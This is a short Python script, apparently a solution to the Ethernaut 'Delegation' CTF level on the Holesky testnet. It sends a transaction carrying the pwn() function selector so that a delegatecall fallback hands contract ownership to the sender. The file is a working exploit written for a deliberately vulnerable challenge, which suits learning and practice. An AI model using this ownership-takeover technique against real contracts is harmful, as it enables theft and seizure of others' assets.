# coding=utf-8
"""
@Project     : Web3-CTF-Intensive-CoLearning
@Author      : Snooowgh
@File Name   : Delegation
@Description :
@Time        : 2024/8/30 10:37
"""
from web3 import Web3
import os

# Holesky
private_key = os.getenv('CTF_PRIVATE_KEY')

w3 = Web3(Web3.HTTPProvider("https://holesky.drpc.org"))
addr = w3.eth.account.from_key(private_key).address

target_contract = "0xEdFC46672c923C1C5B0be138DEC80b00cc230B72"
tx_data = w3.keccak(text="pwn()").hex()[:10]
print(tx_data)

tx = {
    'nonce': w3.eth.get_transaction_count(addr),
    'to': target_contract,
    'value': w3.to_wei(0, 'ether'),
    'gas': 21000 * 10,
    'gasPrice': w3.eth.gas_price,
    "data": tx_data
}

signed_tx = w3.eth.account.sign_transaction(tx, private_key)
tx = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
receipt = w3.eth.wait_for_transaction_receipt(tx)
print(receipt)
